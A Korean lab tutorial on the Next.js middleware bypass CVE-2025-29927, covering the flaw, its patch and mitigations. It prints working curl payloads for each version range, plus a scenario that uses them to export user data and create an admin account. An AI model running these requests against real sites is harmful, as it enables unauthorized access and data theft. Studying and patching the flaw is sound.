import CodeBlock from "@/components/codeblock";
import {
  Table,
  TableHeader,
  TableBody,
  TableRow,
  TableHead,
  TableCell,
} from "@/components/ui/table";


## 취약점 테스트

### 환경 구축

<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead>역할</TableHead>
        <TableHead>구성</TableHead>
        <TableHead>IP</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell>피해자 서버</TableCell>
        <TableCell>Next.js v15.1.7 (Docker)</TableCell>
        <TableCell>192.168.0.3</TableCell>
      </TableRow>

      <TableRow>
        <TableCell>공격자</TableCell>
        <TableCell>Kali Linux</TableCell>
        <TableCell>192.168.216.133</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>
<br/>

**1. GitHub 저장소 클론:**

<CodeBlock
  code={`git clone https://github.com/EQSTLab/CVE-2025-29927
cd next15`}
  id="setup-1"
/>

**2. Docker 이미지 빌드 및 실행:**

<CodeBlock
  code={`docker build -t nextjs .
docker run -p 3000:3000 --rm -it nextjs`}
  id="setup-2"
/>

**3. 웹 브라우저로 접속 확인:**

```
http://192.168.0.3:3000
```

정상적으로 Next.js 서버가 구동되는지 확인합니다.

---

### 정상 접근 테스트 (인증 차단 확인)

**1. 관리자 페이지 접근 시도:**

<CodeBlock code={`curl http://192.168.0.3:3000/admin`} id="test-1" />

**예상 결과:** 인증 없이 접근 시 차단 메시지 또는 리다이렉션

---

### 취약점 Exploit (Middleware 우회)

**1. 버전별 우회 헤더 구성:**


<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead className="text-white">Next.js 버전</TableHead>
        <TableHead className="text-white">우회 Payload</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell className="text-white">v12.2 미만</TableCell>
        <TableCell className="text-white">pages/_middleware</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">v12.2 ~ v14.2</TableCell>
        <TableCell className="text-white">middleware</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">v14.2 이상</TableCell>
        <TableCell className="text-white">middleware:middleware:middleware:middleware:middleware</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>
<br/>

**2. v15.1.7 대상 공격 (v14.2 이상 방식):**

<CodeBlock
  code={`curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \\
  http://192.168.0.3:3000/admin`}
  id="exploit-1"
/>

**예상 결과:** 인증 우회 성공 → 관리자 페이지 내용 출력

---

## Step 1. Next.js Middleware 이해

### Middleware란?

Middleware는 요청-응답 주기에서 **클라이언트 요청이 애플리케이션에 도달하기 전에 처리**되는 중간 계층입니다.

**주요 기능:**

- 요청 전 검증 (인증, 권한 확인)
- 헤더 재작성
- 리디렉션
- 로깅 및 모니터링

**파일 위치:**

```
프로젝트루트/
├── middleware.ts  (또는 middleware.js)
├── app/
├── pages/
└── src/
    └── middleware.ts  (대안 위치)
```

---

### 버전별 Middleware 특징

**v12.2 미만:**

- 모든 디렉토리에 `_middleware.ts` 개별 정의 가능
- 상위 → 하위 디렉토리 순으로 실행
- 예: `pages/_middleware` → `pages/admin/_middleware`

**v12.2 ~ v14.2:**

- 파일명 변경: `_middleware.ts` → `middleware.ts`
- **단일 middleware 파일만 허용** (프로젝트 루트)
- 경로별 적용은 `matcher` 설정 또는 조건문 사용

<CodeBlock
  code={`// middleware.ts 예시
export const config = {
  matcher: '/admin/:path*',  // /admin/* 경로에만 적용
}`}
  id="middleware-1"
/>

**v14.2 이상:**

- 보안 강화: 동일 middleware 경로가 5회 이상 반복될 때 우회 허용
- `x-middleware-subrequest` 헤더 검증 로직 추가

---

## Step 2. 취약점 상세 분석

### Middleware 인증 구현 예시

<CodeBlock
  code={`// middleware.ts
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  const token = request.cookies.get('auth-token')
  
  if (!token && request.nextUrl.pathname.startsWith('/admin')) {
    return NextResponse.redirect(new URL('/login', request.url))
  }
  
  return NextResponse.next()
}

export const config = {
  matcher: '/admin/:path*',
}`}
  id="auth-example"
/>

---

### 취약점 발생 원리

**핵심 로직 (v14.2 미만):**

```javascript
// packages/next/src/server/next-server.ts (의사 코드)
const subrequestHeader = req.headers["x-middleware-subrequest"];
const middlewarePaths = subrequestHeader?.split(":") || [];

if (middlewarePaths.includes(middlewareInfo.name)) {
  // Middleware 이미 실행됨 → 건너뛰기
  return NextResponse.next();
}
```

**문제점:**

- 외부 사용자가 `x-middleware-subrequest` 헤더 조작 가능
- `middlewareInfo.name` 값 예측 가능 (`.next/server/middleware-manifest.json`)

---

### v12.2 미만 우회 기법

**1. Middleware 경로 확인:**

<CodeBlock
  code={`cat .next/server/middleware-manifest.json`}
  id="check-manifest-1"
/>
```json
{
  "middleware": {
    "/pages/admin/_middleware": {
      "name": "pages/admin/_middleware"
    }
  }
}
```

**2. 우회 공격:**

<CodeBlock
  code={`curl -H "x-middleware-subrequest: pages/admin/_middleware" \\
  http://target.com/admin/users`}
  id="bypass-v12-1"
/>

---

### v12.2 ~ v14.2 우회 기법

**1. 변경된 Middleware 경로:**

```json
{
  "middleware": {
    "/middleware": {
      "name": "middleware"
    }
  }
}
```

**2. 단순화된 Payload:**

<CodeBlock
  code={`curl -H "x-middleware-subrequest: middleware" \\
  http://target.com/admin`}
  id="bypass-v13"
/>

> ⚠️ `src/middleware`를 사용하는 경우: `x-middleware-subrequest: src/middleware`

---

### v14.2 이상 우회 기법

**보안 강화 로직:**

```javascript
// packages/next/src/server/web/sandbox/sandbox.ts
const paths = subrequestHeader.split(":");
const count = paths.filter((p) => p === params.name).length;

if (count >= 5) {
  // 5회 이상 반복 → Middleware 건너뛰기
  return handleRequest();
}
```

**우회 공격:**

<CodeBlock
  code={`curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \\
  http://target.com/admin`}
  id="bypass-v14"
/>

**src 디렉토리 사용 시:**

<CodeBlock
  code={`curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \\
  http://target.com/admin`}
  id="bypass-v14-src"
/>

---

## Step 3. 패치 메커니즘 분석

### v15.2.3 보안 강화

**1. 난수 ID 생성:**

```javascript
// packages/next/src/server/lib/router-server.ts
const subrequestId = crypto.getRandomValues(new Uint8Array(8));
global["@next/middleware-subrequest-id"] = subrequestId;
```

**2. ID 검증 로직:**

```javascript
// packages/next/src/server/lib/server-ipc/utils.ts
const requestId = req.headers["x-middleware-subrequest-id"];
const storedId = global["@next/middleware-subrequest-id"];

if (!requestId || requestId !== storedId) {
  delete req.headers["x-middleware-subrequest"];
}
```

**효과:**

- 8바이트 난수는 예측 불가능 (2^64 경우의 수)
- 외부 공격자는 올바른 ID를 생성할 수 없음
- Middleware 우회 시도 차단

---

## 대응 방안

### 버전 확인

<CodeBlock code={`cat package.json | grep '"next":'`} id="check-version" />

**취약 버전:**

- < 15.2.3
- < 14.2.25
- < 13.5.9
- < 12.3.5
- 11.x (전체)

---

### 업그레이드 (권장)

<CodeBlock
  code={`npm install next@15.2.3
# 또는
yarn upgrade next@15.2.3`}
  id="upgrade"
/>

**v11.x 사용자:** 지원 종료로 v15 마이그레이션 필수

---

### 임시 대응 (업그레이드 불가 시)

**Nginx 차단 설정:**

<CodeBlock
  code={`# nginx.conf
location / {
    if ($http_x_middleware_subrequest != "") {
        return 403;
    }
    proxy_pass http://nextjs_backend;
}`}
  id="nginx-block"
/>

**Apache 차단 설정:**

<CodeBlock
  code={`# .htaccess
<If "%{HTTP:x-middleware-subrequest} != ''">
    Require all denied
</If>`}
  id="apache-block"
/>

---

## 실습 종합 시나리오

### 시나리오: 관리자 페이지 침투

**1. 정보 수집:**

<CodeBlock
  code={`# Next.js 버전 확인
curl -I http://target.com

# Middleware 존재 여부 추정

curl http://target.com/admin`}
id="scenario-1"
/>

**2. 취약점 Exploit:**

<CodeBlock
  code={`# v15.1.7 대상 공격
curl -v \\
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \\
  http://target.com/admin/users`}
  id="scenario-2"
/>

**3. 데이터 탈취:**

<CodeBlock
  code={`# API 엔드포인트 접근
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \\
  http://target.com/api/admin/users/export`}
  id="scenario-3"
/>

**4. 권한 확대 (예시):**

<CodeBlock
  code={`# 관리자 계정 생성 시도
curl -X POST \\
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \\
  -H "Content-Type: application/json" \\
  -d '{"username":"attacker","role":"admin"}' \\
  http://target.com/api/admin/users`}
  id="scenario-4"
/>

> ⚠️ 실습은 반드시 허가된 환경에서만 수행하세요!
